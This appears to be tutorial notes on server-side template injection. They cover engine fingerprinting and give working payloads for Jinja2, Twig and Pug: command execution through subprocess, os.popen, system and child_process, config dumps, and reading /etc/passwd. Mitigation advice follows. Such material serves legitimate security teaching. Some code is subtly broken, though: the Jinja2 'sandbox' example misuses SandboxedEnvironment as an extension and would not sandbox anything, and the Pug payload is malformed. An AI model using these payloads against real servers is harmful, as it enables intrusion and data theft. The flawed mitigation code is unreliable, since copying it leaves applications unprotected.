Is a vulnerability that occurs when user input is unsafely incorporated into a server-side template, allowing attackers to inject and execute arbitrary code on the server. Template engines are commonly used in web applications to generate dynamic HTML by combining fixed templates with dynamic data. When these engines process user input without proper sanitatization, they become susceptible to SSTI attacks.
- **Dynamic Content Generation**: Template engines replace placeholders with actual data, allowing applications to generate dynamic HTML pages. This process can be exploited if user inputs are not properly sanitized.
- **User Input as Template Code**: When user inputs are treated as part of the template code, they can introduce harmful logic into the rendered output, leading to SSTI.
The core of SSTI lies in the improper handling of user input within server-side templates. If an attacker can inject malicious payloads into these expressions, they can manipulate the server-side logic and potentially execute arbitrary code.
## Template Engines
A template engine is like a machine that helps build web pages dynamically. Here's how it works in simple terms:
1. **Template**: The engine uses a pre-designed template with placeholders like {{ name }} for dynamic content.
2. **User Input**: The engine receives user input (like a name, age, or message) and stores it in a variable.
3. **Combination**: The engine combines the template with the user input, replacing the placeholders with the actual data.
4. **Output**: The engine generates a final, dynamic web page with the user's input inserted into the template.
Template engines offer various functionalities that speed up the development process but can also introduce risks. Most template engines allow expressions to be used for simple calculations or logic operations within templates.  

In the context of SSTI, the template engine's ability to execute code is what makes it vulnerable to attacks. If user input is not properly sanitized, an attacker can inject malicious code, which the template engine will execute, leading to unintended consequences.
## Common Template Engines
- **Jinja2**: Highly popular in Python applications, known for its expressiveness and powerful rendering capabilities.
- **Twig**: The default template engine for Symfony in PHP, Twig offers a robust environment with secure default settings.
- **Pug/Jade**: Known for its minimal and clean HTML templating syntax, Pug/Jade is popular among Node.js developers.
#### Jinja2 Example:
```python
from jinja2 import Template

hello_template = Template("Hello, {{ name }}!")
output = hello_template.render(name="World")
print(output)
```
## Determining the Template Engine
Different template engines have distinct syntaxes and features, making them vulnerable to SSTI in various ways. Here are some examples of vulnerable template syntaxes:


```
                             Smarty
                           /
                         o
                        /
          a{*comment*}b                          Mako
        /               \                       /
       o                 x                     o
      /                   \                  /
${7*7}                     ${"z".join("ab")} ---- x ---- Unknown
      \
        x                                ---- o ---- 7777777 Jinja2
         \                              /
           {{7*7}} ---- o ---- {{7*'7'}} ---- o ---- 49 Twig
               \                        \
                 x                        x
                  \                        \
                   Not Vulnerable           Unknown
```
#### Python - Jinja2 
 If you use the payload {{7*'7'}}  in Jinja2, the output would be 7777777
 **Key Vulnerability Points:**

- **Expression Evaluation**: Jinja2 evaluates expressions within curly braces `{{ }}`, which can execute arbitrary Python code if crafted maliciously.
- **Template Inheritance and Imports**: Advanced features like template inheritance and macro imports can be misused to execute unintended code, leading to information disclosure or server manipulation.
Once Jinja2's use is confirmed, we can the use the payload `{{"".__class__.__mro__[1].__subclasses__()[157].__repr__.__globals__.get("__builtins__").get("__import__")("subprocess").check_output("ls")}}`
Below is the breakdown of the above payload:

- `"".__class__.__mro__[1]` accesses the base `object` class, the superclass of all Python classes.
- `__subclasses__()`: Lists all subclasses of `object`, and `[157]` is typically the index for the `subprocess.Popen` class (this index may vary and should be checked in the target environment).
- The subsequent method chains dynamically import and use the `subprocess` module to execute the `ls` command, capturing its output.
The `check_output` function is designed to enhance security by separating the command from its arguments, which helps to prevent [[shell]] injection attacks. Here's the general syntax:

```python
subprocess.check_output([command, arg1, arg2])
```

- **command**: A string that specifies the command to execute.
- **arg1, arg2, ...**: Additional arguments that should be passed to the command.

**Information Disclosure**: We can exploit the SSTI vulnerability to obtain internal information about the web application, including configuration details and the web application's source code.
```jinja2
{{ config.items() }}
```
Since this payload dumps the entire web application configuration, including any used secret keys, we can prepare further attacks using the obtained information. We can also execute Python code to obtain information about the web application's source code.
```jinja2
{{ self.__init__.__globals__.__builtins__ }}
```
**Local File Inclusion (LFI)**
```jinja2
{{ self.__init__.__globals__.__builtins__.open("/etc/passwd").read() }}
```
**RCE**
```jinja2
{{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}
```
#### Twig
If you use the payload {{7*'7'}} in Twig, the output would be 49.
**Information disclosure** 
In Twig, we can use the `_self` keyword to obtain a little information about the current template:
```twig
{{ _self }}
```
**Local File Inclusion (LFI)**
Reading local files (without using the same way as we will use for RCE) is not possible using internal functions directly provided by Twig. However, the PHP web framework [Symfony](https://symfony.com/) defines additional Twig filters. One of these filters is [file_excerpt](https://symfony.com/doc/current/reference/twig_reference.html#file-excerpt) and can be used to read local files:
```twig
{{ "/etc/passwd"|file_excerpt(1,-1) }}
```
**Remote Code Execution (RCE)**
To achieve remote code execution, we can use a PHP built-in function such as system. We can pass an argument to this function by using Twig's `filter` function, resulting in any of the following SSTI payloads:

```twig
{{ ['id'] | filter('system') }}
```
#### NodeJS - Jade/Pug
Pug/Jade evaluates JavaScript expressions within `#{}`. For example using the payload #{7* 7} would return 49. 
Pug/Jade allows JavaScript execution within its templates without the need for additional delimiters like {{ }}. For example: `#{root.process.mainModule.require{'child_process'}.spawnSync("id").stdout}

The function signature for `spawnSync` is:

```javascript
spawnSync(command, [args], [options])
```

- **command**: This is a string that specifies the command to run.
- **args**: This is an array of string arguments to pass to the command.
- **options**: This is an optional parameter that can specify various options such as the working directory, environment variables, input, output, timeout, and more.

**Key Vulnerability Points:**

- **JavaScript Interpolation**: Pug allows embedding JavaScript directly within templates using interpolation braces `#{}`. If user input is interpolated without proper sanitization, it can lead to arbitrary code execution.
- **Default Escaping**: Pug does provide automatic escaping for certain inputs, converting characters like `<`, `>`, and `&` to their HTML entity equivalents to prevent XSS attacks. However, this default behaviour does not cover all potential security issues, particularly when dealing with unescaped interpolation `!{}` or complex input scenarios.
#### PHP - Smarty
Inject a simple Smarty tag like `{'Hello'|upper}` to see if it will be processed. If the application returns "HELLO", it means that the template engine used by the application is Smarty.
Once you confirm that the site is vulnerable to SSTI via Smarty, you can craft a payload that uses PHP functions that execute system commands. One of the most common functions that do this is the `system()` function.
## Tools
**SSTImap** is a tool that automates the process of testing and exploiting SSTI vulnerabilities in various template engines. Hosted on [GitHub](https://github.com/vladko312/SSTImap), it provides a framework for discovering template injection flaws.

## Mitigations
### Jinja2

1. **Sandbox Mode**: Enable the sandboxed environment in Jinja2 to restrict the template's ability to access unsafe functions and attributes. This prevents the execution of arbitrary Python code. For example:

```python
from jinja2 import Environment, select_autoescape, sandbox

env = Environment(
	autoescape=select_autoescape(['html', 'xml']),
	extensions=[sandbox.SandboxedEnvironment]
)
```

1. **Input Sanitization**: Always sanitize inputs to escape or remove potentially dangerous characters and strings that can be interpreted as code. This is crucial when inputs are directly used in template expressions.

2. **Template Auditing**: Regularly review and audit templates for insecure coding patterns, such as directly embedding user input without sanitization.
### Jade (Pug)

1. **Avoid Direct JavaScript Evaluation**: Restrict or avoid using Pug’s ability to evaluate JavaScript code within templates. Use alternative methods to handle dynamic content that do not involve direct code execution. For example:
```pug
var user = !{JSON.stringify(user)}
h1= user.name
```
Use `!{}` carefully as it allows unescaped output, which can be harmful. Prefer `#{}` which escapes HTML by default.
2. **Validate and Sanitize Inputs**: Ensure all user inputs are validated against a strict schema and sanitized before they are rendered by the template engine. This reduces the risk of malicious code execution.
3. **Secure Configuration Settings**: Use environment settings and configuration options that minimize risks, such as disabling any features that allow script execution.
### Smarty
1. **Disable `{php}` Tags**: Ensure that `{php}` tags are disabled in Smarty configurations to prevent the execution of PHP code within templates.
```php
$smarty->security_policy->php_handling = Smarty::PHP_REMOVE;
$smarty->disable_security = false;
```

1. **Use Secure Handlers**: If you must allow users to customize templates, provide a secure set of tags or modifiers that they can use, which do not allow direct command execution or shell access.
2. **Regular Security Reviews**: Conduct security reviews of the template files and the data handling logic to ensure that no unsafe practices are being used. Regularly update Smarty to keep up with security patches.
### Sandboxing in Template Engines
Sandboxing is a security feature that restricts the execution of potentially harmful code within templates. It limits the actions that templates can perform, such as file operations or system command execution. Proper sandboxing helps prevent security issues like SSTI.
**Importance of Sandboxing**
- **Function Restrictions**: Limits the functions or methods that can be called from within the template, blocking potentially harmful operations.
- **Variable and Data Access**: Controls access to global variables or sensitive data, ensuring templates cannot manipulate or expose critical information.


## Tools
The most popular tool for identifying and exploiting SSTI vulnerabilities is [tplmap](https://github.com/epinna/tplmap). However, tplmap is not maintained anymore and runs on the deprecated Python2 version. Therefore, we will use the more modern [SSTImap](https://github.com/vladko312/SSTImap) to aid the SSTI exploitation process.